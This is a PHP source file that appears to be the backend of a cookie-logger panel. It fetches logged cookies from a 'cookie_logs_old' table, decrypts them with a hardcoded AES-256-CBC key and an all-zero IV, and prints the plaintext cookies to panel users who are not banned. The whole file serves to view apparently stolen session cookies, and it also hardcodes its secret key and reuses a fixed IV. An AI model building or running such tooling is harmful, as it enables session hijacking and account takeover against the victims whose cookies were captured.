<?php
    @session_start();
    require_once 'includes/functions.php';

    header('Content-type: application/json; charset=UTF-8');
    
    $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
    $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();

     if (isset($_POST['id']) && !empty($_POST['id'])){

        if($banned == 0){

            $get = pdoQuery($db, "SELECT * FROM `cookie_logs_old` WHERE `cookieID`=?", [htmlspecialchars($_POST['id'])]);
            $results = $get->fetchAll(PDO::FETCH_ASSOC);

            foreach($results as $result){
                $cookie = decryptt(htmlspecialchars($result['cookie']));

                echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-darkwhite'>
                <div class='p-2 bd-highlight'>$cookie</div>
                </div>";
            }
        }else{
            echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-lightred'>
            <div class='p-2 bd-highlight'>You are banned. :'D</div>
            </div>";
        }
     }

    //  function encrypt($text){
    //     $password = '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';
    //     $method = 'aes-256-cbc';
    
    //     $password = substr(hash('sha256', $password, true), 0, 32);
    //     $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    //     $encrypted = base64_encode(openssl_encrypt($text, $method, $password, OPENSSL_RAW_DATA, $iv));
    
    //     return $encrypted;
    // }
    function decryptt($text){
        $password = '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';
        $method = 'aes-256-cbc';
    
        $password = substr(hash('sha256', $password, true), 0, 32);
        $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
        $decrypted = openssl_decrypt(base64_decode($text), $method, $password, OPENSSL_RAW_DATA, $iv);
    
        return $decrypted;
    }
?>